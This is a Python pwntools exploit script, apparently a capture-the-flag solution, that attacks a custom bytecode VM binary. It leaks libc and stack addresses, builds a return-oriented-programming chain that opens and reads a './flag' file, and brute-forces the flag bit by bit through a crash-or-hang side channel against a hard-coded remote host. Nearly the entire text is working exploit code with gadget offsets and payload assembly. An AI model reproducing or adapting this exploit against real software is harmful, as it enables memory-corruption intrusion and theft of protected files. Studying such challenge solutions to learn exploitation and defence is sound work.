#!/usr/bin/python

from pwn import *
import traceback

context.log_level = 'error'
#context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
flag_lenth = 0x30
'''
3EE098 environ
0x00000000000008aa : ret
0x000000000002155f : pop rdi ; ret
0x0000000000023e6a : pop rsi ; ret
0x0000000000001b96 : pop rdx ; ret
0x00000000000439c8 : pop rax ; ret
0x00000000001480c7 : test rax, rax ; jne 0x1480d6 ; ret
0x000000000003088d : and eax, esi ; ret
0x00000000000e0120 : mov eax, dword ptr [rdi] ; ret
.text:00000000000E4E35                 syscall
0x0000000000054803 : leave ; ret
.text:0000000000097080                 test    rax, rax      ;     jnz
0x0000000000116dac : test eax, eax ; je 0x116db7 ; ret
0x0000000000145786 : test eax, eax ; je 0x145795 ; ret
0x000000000014c7e6 : test eax, eax ; je 0x14c7f5 ; ret
0x000000000006eacd : xchg eax, edi ; ret

0x00000000000522e0 : push rax ; pop rbx ; ret
0x0000000000082867 : mov dword ptr [rcx], eax ; ret
0x000000000004440a : mov dword ptr [rdi], eax ; ret
0x00000000000e46ee : pop rcx ; ret
0x00000000001aba66 : mov edi, dword ptr [rdx] ; ret
'''
time_out = 2
if args.R:
    pop_rdi = 0x000000000002155f
    pop_rsi = 0x0000000000023e8a
    pop_rdx = 0x0000000000001b96
    pop_rax = 0x0000000000043a78
    branch = 0x00000000008eafc
    cmp_eax_rsi = 0x000000000003091d
    mov_eax_rdi = 0x00000000000e0180
    syscall = 0x00000000000E4E95
    ret_addr = 0x00000000000008aa
    pop_rcx = 0x00000000000e46ee
    mov_edi_rdx = 0x00000000001aba66
    mov_rcx_eax = 0x0000000000082867
    #xchg_eax_edi = 0x6eacd
else:
    pop_rdi = 0x000000000002155f
    pop_rsi = 0x0000000000023e6a
    pop_rdx = 0x0000000000001b96
    pop_rax = 0x00000000000439c8
    branch = 0x00000000008ea8c
    cmp_eax_rsi = 0x000000000003088d
    mov_eax_rdi = 0x00000000000e0120
    syscall = 0x00000000000E4E35 
    ret_addr = 0x00000000000008aa
    one_gadget = 0x10a38c
    malloc_hook = 0x3EBC30
    free_hook = 0x3ED8E8
    xchg_eax_edi = 0x6eacd

def push(index):
    return b'\x01' + p8(index)
def pop(index):
    return b'\x02' + p8(index)
def add(index,value):
    magic = 0
    if len(value) == 1:
        magic = 0
    elif len(value) == 2:
        magic = 1
    elif len(value) == 4:
        magic = 2
    elif len(value) == 8:
        magic = 3
    return b'\x03' + p8(magic) + p8(index) + value
def sub(index,value):
    magic = 0
    if len(value) == 1:
        magic = 0
    elif len(value) == 2:
        magic = 1
    elif len(value) == 4:
        magic = 2
    elif len(value) == 8:
        magic = 3
    return b'\x04' + p8(magic) + p8(index) + value
def jmp(offset):
    return p8(11) + p8(offset)
def call(offset):
    return p8(12) + p16(offset)
def ret():
    return p8(13)
def mov_reg_reg(index1,index2):
    return p8(14) + p8(index1) + p8(index2)
def mov_mem_reg(index1,index2):
    return p8(15) + p8(index1) + p8(index2)
def mov_reg_mem(index1,index2):
    return p8(16) + p8(index1) + p8(index2)
def debug():
    return p8(18)
def mov_reg_value(index,value):
    magic = 0
    if len(value) == 1:
        magic = 0
    elif len(value) == 2:
        magic = 1
    elif len(value) == 4:
        magic = 2
    elif len(value) == 8:
        magic = 3
    return p8(17) + p8(magic) + p8(index) + value

def write_stack(reg_index,value):
    res = b''
    res += mov_reg_reg(5,reg_index) + add(5,p64(value)) + mov_mem_reg(4,5) + add(4,p16(8))
    return res
def write_mem(reg_index,addr,value):
    res = b''
    res += mov_reg_value(5,p64(value)) + mov_reg_reg(3,reg_index) + add(3,p64(addr)) + mov_mem_reg(3,5)
    return res    

def connect():
    if args.R:
        p = remote('59.110.63.160', 8521)
        #p = remote('0.0.0.0',9999)
        #p = process('./vm',env = {'LD_PRELOAD':'./libc-2.27.so'})
        #p = process('./vm')
    else:
        p = process('./vm')
    return p

def gen(offset,value):
    payload = call(0x700 - 3) #+ debug()
    lenth = len(payload)
    payload += call(0x800 - 3 - lenth)
    payload += jmp(10) + push(0) * 5 + pop(0) * 4 + pop(6) + sub(6,p64(0x3ebca0)) # reg6 = libc_base

    ropchain = b''
    if args.R:
        ropchain += write_stack(6,pop_rdi) + write_stack(7,0xf00) + write_stack(6,pop_rsi) + write_stack(0,0) + write_stack(6,pop_rdx) + write_stack(0,0) + write_stack(6,pop_rax) + write_stack(0,2) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rcx) + write_stack(4,0x18) + write_stack(6,mov_rcx_eax) + write_stack(6,pop_rdi) + write_stack(0,3)
        ropchain += write_stack(6,pop_rsi) + write_stack(7,0xf80) + write_stack(6,pop_rdx) + write_stack(0,flag_lenth) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        #ropchain += write_stack(6,pop_rdi) + write_stack(0,1) + write_stack(6,pop_rsi) + write_stack(7,0xf80) + write_stack(6,pop_rdx) + write_stack(0,0x30) + write_stack(6,pop_rax) + write_stack(0,1) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rdi) + write_stack(7,0xf80 + offset) + write_stack(6,pop_rax) + write_stack(0,0) +  write_stack(6,mov_eax_rdi) + write_stack(6,pop_rsi) + write_stack(0,value) + write_stack(6,cmp_eax_rsi) + write_stack(6,branch)
        ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        #ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)

    else:
        ropchain += write_stack(6,pop_rdi) + write_stack(7,0xf00) + write_stack(6,pop_rsi) + write_stack(0,0) + write_stack(6,pop_rdx) + write_stack(0,0) + write_stack(6,pop_rax) + write_stack(0,2) + write_stack(6,syscall)
        ropchain += write_stack(6,xchg_eax_edi) + write_stack(6,pop_rsi) + write_stack(7,0xf80) + write_stack(6,pop_rdx) + write_stack(0,flag_lenth) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rdi) + write_stack(7,0xf80 + offset) + write_stack(6,pop_rax) + write_stack(0,0) +  write_stack(6,mov_eax_rdi) + write_stack(6,pop_rsi) + write_stack(0,value) + write_stack(6,cmp_eax_rsi) + write_stack(6,branch)
        ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        ropchain += write_stack(6,pop_rdi) + write_stack(0,0) + write_stack(6,pop_rsi) + write_stack(7,0xe00) + write_stack(6,pop_rdx) + write_stack(0,0x4) + write_stack(6,pop_rax) + write_stack(0,0) + write_stack(6,syscall)
        
    payload += mov_reg_reg(5,6) + add(5,p64(0x3EE098)) + mov_reg_mem(4,5) + sub(4,p64(0xf0+0x30)) #reg4 stack
    payload += mov_reg_mem(1,4) + mov_reg_value(0,p64(0))# + debug()
    payload += write_mem(7,0xf80,0) + write_mem(7,0xf88,1)
    payload += ropchain #+ debug()
    
    payload += b'\xff'
    payload = payload.ljust(0x700,b'\x00')
    payload += jmp(4) + push(0) * 2 + pop(0) + pop(7) + push(7) + push(0) + sub(7,p8(3)) + ret()# + debug() + debug() #reg[7] = text_base
    payload = payload.ljust(0x800,b'\x00')

    payload += mov_reg_value(0,p64(0)) + mov_reg_value(1,p64(0x111)) + mov_reg_value(2,p64(0x601))
    payload += push(0) + jmp(2) + pop(0) + push(0) * int(0xe8 / 8) + push(1) + push(0) #+ debug()
    payload += push(0) * int(0x5f0 / 8) + push(2) + ret()

    payload = payload.ljust(0xf00,b'\x00') + b'./flag\x00'
    payload = payload.ljust(0x1000,b'\x00')
    return payload

def exp(p,payload):   
    p.recvuntil('VM has been initialized. Please input your code: \n')
    p.send(payload)
    p.recvuntil('Now we will check your code and run it in a sandbox.\n')
    #p.recvline()
    p.recv(1,timeout = time_out)

def brute(index):
    value = 0
    for offset in range(8):
        #sleep(time_out)
        p = connect()
        try:
            payload = gen(index,(1 << offset))
            exp(p,payload)
        except KeyboardInterrupt:
            #traceback.print_exc()
            exit(1)
        except:
            #traceback.print_exc()
            value |= (1 << offset)
            print('value[%d] %s' % (index,hex(value)))
            #print(Arguement)
            p.close()
        else:
            p.close()
    #print('flag[%d] : %c' % (index,p8(value)))
    return value

index = 0
flag = b''

for index in range(flag_lenth):
    value = brute(index)
    flag += p8(value)
    print('flag : %s' % flag)

p.interactive()